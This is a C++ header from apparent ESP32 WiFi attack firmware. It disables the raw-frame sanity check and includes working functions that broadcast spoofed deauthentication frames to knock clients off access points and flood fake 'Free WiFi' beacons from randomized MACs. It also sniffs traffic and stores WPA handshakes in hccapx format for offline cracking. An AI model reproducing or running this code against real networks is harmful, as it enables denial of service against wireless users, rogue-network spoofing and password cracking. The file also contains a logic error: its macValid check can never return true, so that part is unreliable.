#pragma once
#include <Arduino.h>
#include "esp_wifi.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include <vector>
#include <map>
#include "setup.h"
#include "log.h"
#include "hccapx.h"

using namespace std;

namespace currentPacketCounts {unsigned long packetc = 0, beaconc = 0, deauthc = 0, probec = 0, datac = 0, eapolc = 0;int rssitol = 0;}

template <typename T>
struct PsramAllocator {
	using value_type = T;

	PsramAllocator() = default;
	template <class U> constexpr PsramAllocator(const PsramAllocator<U>&) noexcept {}

	T* allocate(std::size_t n) {
		T* p = static_cast<T*>(heap_caps_malloc(n * sizeof(T), MALLOC_CAP_SPIRAM));
		if (!p) throw std::bad_alloc();
		return p;
	}

	void deallocate(T* p, std::size_t) noexcept {
		heap_caps_free(p);
	}
};

uint8_t probe_packet[] = {
    0x40, 0x00, // Frame Control: Probe Request
    0x00, 0x00, // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (Broadcast)
    0x96, 0x96, 0x96, 0x96, 0x96, 0x96, // Source (Station's MAC Address, to be set dynamically)
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // BSSID (Broadcast)
    0x00, 0x00, // Sequence number
    // Tagged Parameters (SSID and supported rates)
    0x00, 0x00,                         // SSID Parameter Set (SSID Length = 0 for broadcast)
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, // Supported Rates (1, 2, 5.5, 11 Mbps)
    0x12, 0x24, 0x48, 0x6c              // Extended Supported Rates (18, 36, 72, 108 Mbps)
};

enum pkt_type {
	PKT_PROBE,
	PKT_AUTH,
	PKT_DEAUTH,
};
struct HCCAPX_Entry {
    hccapx_t hccapx; // i hate unique_ptr now
    unsigned message_ap = 0;
    unsigned message_sta = 0;
};
struct STA_Info {
	array<uint8_t, 6> mac;
	int packetCount = 0, totalPacketCount = 0, packetsFromAP = 0, packetsToAP = 0, packetPerSecond = 0, rssitol = 0, rssi = 0;
	unsigned long lastPacketUpdate = 0;
};
struct AP_Info {
	String ssid;
	array<uint8_t, 6> bssid;
	vector<STA_Info> STAs;
	int rssitol = 0, rssi = 0, packetc = 0, m1 = 0, m2 = 0, m3 = 0, m4 = 0;
	unsigned long lastPacketUpdate = 0, foundTime = 0;
	vector<HCCAPX_Entry> hccapx_list;
	bool hccapx_saved = false;
};
struct Unconnected_STA {
	array<uint8_t, 6> mac;
	unsigned int probec = 0, authc = 0,deauthc = 0;
	unsigned long foundTime, lastPacketUpdate = 0;
	bool connected = false;
};

std::map<uint8_t, vector<AP_Info>> AP_Map;
vector<Unconnected_STA, PsramAllocator<Unconnected_STA>> Unconnected_STA_Map;
vector<uint8_t> channels;
static size_t channel_index = 0;
bool deauthActive = false;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {return 0;}

void init_wifi() {
	nvs_flash_init();
	esp_netif_init();
	esp_event_loop_create_default();
	wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
	ESP_ERROR_CHECK(esp_wifi_init(&cfg));

	ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
	ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
	ESP_ERROR_CHECK(esp_wifi_start());
	
	wifi_promiscuous_filter_t filter;
	wifi_promiscuous_filter_t ctrl_filter;

	#if defined(CUSTOM_FILTER)
	filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_CTRL;
	ctrl_filter.filter_mask = WIFI_PROMIS_CTRL_FILTER_MASK_ACK;
	#elif BASIC_FRAMES
	filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
	ctrl_filter.filter_mask = 0;
	#else
	filter.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
	ctrl_filter.filter_mask = WIFI_PROMIS_CTRL_FILTER_MASK_ALL;
	#endif
	ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
	ESP_ERROR_CHECK(esp_wifi_set_promiscuous_ctrl_filter(&ctrl_filter));
}

const array<uint8_t, 6> broadcastMac = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

inline bool isBroadcast(const array<uint8_t, 6>mac) {
	return mac == broadcastMac;
}
inline bool macValid(const array<uint8_t, 6>mac) {
	const array<uint8_t, 6> zeroMac = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
	return (mac == zeroMac) && (mac == broadcastMac) && !(mac[0] & 0x01);
}
void sendDeauth(const uint8_t *bssid) {
	uint8_t deauth_frame[26] = {0xc0, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, MAC2STR(bssid), MAC2STR(bssid), 0x00, 0x00, 0x02, 0x00};
	// Serial.printf("Sending deauth to BSSID: "MACSTR"\n", MAC2STR(bssid));
	ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false));
}
// String formatMAC(const uint8_t* mac) {
//    char macStr[18];
//    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", MAC2STR(mac));
//	return macStr;
// }
// String BSSID2NAME(const uint8_t* mac, bool checkSTA = true) {
// 	for (auto& [channel, aps] : AP_Map) for (auto& ap : aps) {
// 		if (memcmp(ap.bssid.data(), mac, 6) == 0) return ap.ssid;
// 		if (checkSTA) for (auto& sta : ap.STAs) if (memcmp(mac, sta.mac.data(), 6) == 0) return formatMAC(mac) + " ST";
// 	}
// 	return formatMAC(mac);
// }

const char* formatMAC(array<uint8_t, 6> mac) {
    char* result = (char*)malloc(18);
	snprintf(result, 18, MACSTR, MAC2STR(mac));
	for (int i = 0; result[i]; i++) result[i] = toupper(result[i]);
    return result;
}

// const char* BSSID2NAME(const uint8_t* mac, bool checkSTA = true) {
// 	// abort();
//     char* result = NULL;

//     for (auto& [channel, aps] : AP_Map) {
//         for (auto& ap : aps) {
//             if (memcmp(ap.bssid.data(), mac, 6) == 0) {
//                 result = (char*)malloc(ap.ssid.length() + 1);
// 				strncpy(result, ap.ssid.c_str(), ap.ssid.length());
// 				result[ap.ssid.length()] = '\0';
//                 return result;
//             }

//             if (checkSTA) {
//                 for (auto& sta : ap.STAs) {
//                     if (memcmp(mac, sta.mac.data(), 6) == 0) {
//                         result = (char*)malloc(18);
//                         snprintf(result, 18, MACSTR, MAC2STR(mac));
// 						for (int i = 0; result[i]; i++) result[i] = toupper(result[i]);
//                         return result;
//                     }
//                 }
//             }
//         }
//     }

//     result = (char*)malloc(18);
// 	snprintf(result, 18, MACSTR, MAC2STR(mac));
// 	for (int i = 0; result[i]; i++) result[i] = toupper(result[i]);
//     return result;
// }

// const char* BSSID2NAME(const array<uint8_t, 6> mac, bool checkSTA = true) {
//     char* result = NULL;

//     for (auto& [channel, aps] : AP_Map) {
//         for (auto& ap : aps) {
//             if (mac == ap.bssid) {
//                 result = (char*)malloc(ap.ssid.length() + 1);
// 				strncpy(result, ap.ssid.c_str(), ap.ssid.length());
// 				result[ap.ssid.length()] = '\0';
//                 return result;
//             }

//             if (checkSTA) {
//                 for (auto& sta : ap.STAs) {
//                     if (mac == sta.mac) {
//                         result = (char*)malloc(18);
//                         snprintf(result, 18, MACSTR, MAC2STR(mac));
// 						for (int i = 0; result[i]; i++) result[i] = toupper(result[i]);
//                         return result;
//                     }
//                 }
//             }
//         }
//     }

//     result = (char*)malloc(18);
// 	snprintf(result, 18, MACSTR, MAC2STR(mac));
// 	for (int i = 0; result[i]; i++) result[i] = toupper(result[i]);

//     return result;
// }

void addAP(wifi_promiscuous_pkt_t* pkt, uint16_t pktlen) {
#ifdef DONT_ADD_AP_NO_SCAN
	return;
#endif
	if (!no_scan_mode) return;
	array<uint8_t, 6> bssid;
	memcpy(bssid.data(), &pkt->payload[10], 6);

	uint8_t ssidLength = pkt->payload[37];
	String ssid;
	if (ssidLength > 0 && ssidLength <= 32) ssid = String((char*)&pkt->payload[38]).substring(0, ssidLength);
	else ssid = "<Hidden>";
	//TODO: add wpa3 detection
	uint8_t* taggedParams = &pkt->payload[37 + 1 + ssidLength];
	uint8_t apChannel = 0;

	while (taggedParams < pkt->payload + pktlen) {
		uint8_t tagNumber = taggedParams[0];
		uint8_t tagLength = taggedParams[1];
		if (tagNumber == 3 && tagLength == 1) {apChannel = taggedParams[2];break;}
		taggedParams += (2 + tagLength);
	}

	bool exists = false;
	for (auto& ap : AP_Map[apChannel]) if (memcmp(ap.bssid.data(), bssid.data(), 6) == 0) {exists = true;ap.foundTime = millis();break;}

	if (!exists) {
		AP_Info newAP;
		newAP.ssid = ssid.substring(0, AP_SSID_MAX_LEN);
		newAP.bssid = bssid;
		newAP.rssi = pkt->rx_ctrl.rssi;
		newAP.lastPacketUpdate = millis();
		AP_Map[apChannel].push_back(newAP);
		log1(0xB7E0, "+ %s|Ch %d", ssid.c_str(), apChannel);
	}
}

#define for_each_aps for (auto& [channel, aps] : AP_Map) for (auto& ap : aps)
#define for_each_sta_in_aps for (auto& [channel, aps] : AP_Map) for (auto& ap : aps) for (auto& sta : ap.STAs)
#define for_each_sta(ap) for (auto& sta : ap.STAs)
#define for_each_unconnected_sta for (auto& usta : Unconnected_STA_Map)

bool isAP(const std::array<uint8_t, 6>& mac) {
	for_each_aps if (ap.bssid == mac) return true;
	return false;
}
bool isSTA(const std::array<uint8_t, 6>& mac) {
	for_each_sta_in_aps if (sta.mac == mac) return true;
	return false;
}
void adduSTA(pkt_type type, array<uint8_t, 6> macFrom, array<uint8_t, 6> macTo, array<uint8_t, 6> bssid) {
	for_each_sta_in_aps if (sta.mac == macTo || sta.mac == macFrom) return;

	bool exists = false;
	for_each_unconnected_sta {
		if (usta.mac == macTo || usta.mac == macFrom) {
			// if (isAP(macFrom)) return;
			if (type == PKT_AUTH) usta.authc++;
			else if (type == PKT_DEAUTH) usta.deauthc++;
			else if (type == PKT_PROBE) usta.probec++;
			exists = true;
			usta.lastPacketUpdate = millis();
			break;
		}
	}

	if (!exists) {
		Unconnected_STA newSTA;
		if (macTo == bssid) newSTA.mac = macFrom; // from sta to ap
		else if (macFrom == bssid) newSTA.mac = macTo; // from ap to sta
		else if (isBroadcast(bssid) || isBroadcast(macTo)) newSTA.mac = macFrom; // from sta to broadcast
		else return;
		newSTA.foundTime = millis();
		newSTA.lastPacketUpdate = millis();
		if (type == PKT_AUTH) newSTA.authc++;
		else if (type == PKT_DEAUTH) newSTA.deauthc++;
		else if (type == PKT_PROBE) newSTA.probec++;
		Unconnected_STA_Map.push_back(newSTA);
	}
}


uint8_t beacon_packet1[164] = {
	0x80, 0x00, 0x00, 0x00, // Frame Control
	0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
	0x69, 0x96, 0x69, 0x00, 0x00, 0x00, // Source
	0x69, 0x96, 0x69, 0x00, 0x00, 0x00, // BSSID
	0x00, 0x00, // Sequence Control
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
	0x64, 0x00, // Beacon interval
	0x31, 0x14, // Capability info

	// Tags
	0x00, 0x17, // SSID tag
	'F', 'r', 'e', 'e', ' ', 'W', 'i', 'F', 'i', ' ', 'P', 'a', 's', 's', ':', '1', '2', '3', '4', '5', '6', '7', '8',

	0x01, 0x08, // Supported Rates
	0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24, // 1, 2, 5.5, 11, 6, 9, 12, 18 Mbps
	
	0x32, 0x04, // Extended Supported Rates 
	0x30, 0x48, 0x60, 0x6C, // 24, 36, 48, 54 Mbps

	0x03, 0x01, // DS Parameters
	0x01, // Channel

	0x30, 0x14, // RSN
	0x01, 0x00, // RSN version 1
	0x00, 0x0F, 0xAC, 0x04, // Group Cipher Suite
	0x01, 0x00, // Pairwise cipher count = 1
	0x00, 0x0F, 0xAC, 0x04, // Pairwise Cipher Suite List: CCMP
	0x01, 0x00, // Auth Key Management Suite Count = 1
	0x00, 0x0F, 0xAC, 0x02, // AKM Suite List: PSK
	0x00, 0x00, // RSN Capabilities

	0x2D, 0x1A, // HT Capabilities
	0xEF, 0x19, // HT Capabilities Info
	0x17, 0xFF, // A-MPDU Parameters
	0xFF, 0x00, 0x00, 0x00, // Supported MCS Set (only first byte usually needed)
	0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00,
	0x00, 0x00,

	0x3D, 0x16, // HT Operation Tag ID + Length = 22 bytes
	0x01, // Primary Channel = 1
	0x00, // HT Info Subset 1
	0x1C, 0x00, // HT Info Subset 2 & 3
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Basic MCS Set
	0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00,
	
	0x7F, 0x08, // Extended Capabilities
	0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0x00,
};

uint8_t beacon_packet2[128] = {
	0x80, 0x00, 0x00, 0x00, // Frame Control
	0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
	0x69, 0x96, 0x69, 0x00, 0x00, 0x00, // Source
	0x69, 0x96, 0x69, 0x00, 0x00, 0x00, // BSSID
	0x00, 0x00, // Sequence Control
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
	0x64, 0x00, // Beacon interval
	0x31, 0x04, // Capability info

	// Tags
	0x00, 0x9, // SSID tag
	'F', 'r', 'e', 'e', ' ', 'W', 'i', 'F', 'i',

	0x01, 0x08, // Supported Rates
	0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24, // 1, 2, 5.5, 11, 6, 9, 12, 18 Mbps
	
	0x32, 0x04, // Extended Supported Rates 
	0x30, 0x48, 0x60, 0x6C, // 24, 36, 48, 54 Mbps

	0x03, 0x01, // DS Parameters
	0x01, // Channel

	0x2D, 0x1A, // HT Capabilities
	0xEF, 0x19, // HT Capabilities Info
	0x17, 0xFF, // A-MPDU Parameters
	0xFF, 0x00, 0x00, 0x00, // Supported MCS Set (only first byte usually needed)
	0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00,
	0x00, 0x00,

	0x3D, 0x16, // HT Operation Tag ID + Length = 22 bytes
	0x01, // Primary Channel = 1
	0x00, // HT Info Subset 1
	0x1C, 0x00, // HT Info Subset 2 & 3
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Basic MCS Set
	0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00,
	
	0x7F, 0x08, // Extended Capabilities
	0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0x00,
};


static bool _;
void beaconXD() {;
	_ = !_;
	if (_) {
		beacon_packet1[10] = beacon_packet1[16] = esp_random() % 0xFF;
		beacon_packet1[11] = beacon_packet1[17] = esp_random() % 0xFF;
		beacon_packet1[12] = beacon_packet1[18] = esp_random() % 0xFF;
		beacon_packet1[79] = channel_index;
		beacon_packet1[132] = channel_index;
	} else {
		beacon_packet2[10] = beacon_packet2[16] = esp_random() % 0xFF;
		beacon_packet2[11] = beacon_packet2[17] = esp_random() % 0xFF;
		beacon_packet2[12] = beacon_packet2[18] = esp_random() % 0xFF;
		beacon_packet2[66] = channel_index;
		beacon_packet2[96] = channel_index;
	}
	
	ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_80211_tx(WIFI_IF_STA, _ ? beacon_packet1 : beacon_packet2, _ ? 164 : 128, false));
	// ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_80211_tx(WIFI_IF_STA, _ ? beacon_packet1 : beacon_packet2, sizeof(_ ? beacon_packet1 : beacon_packet2), false));
}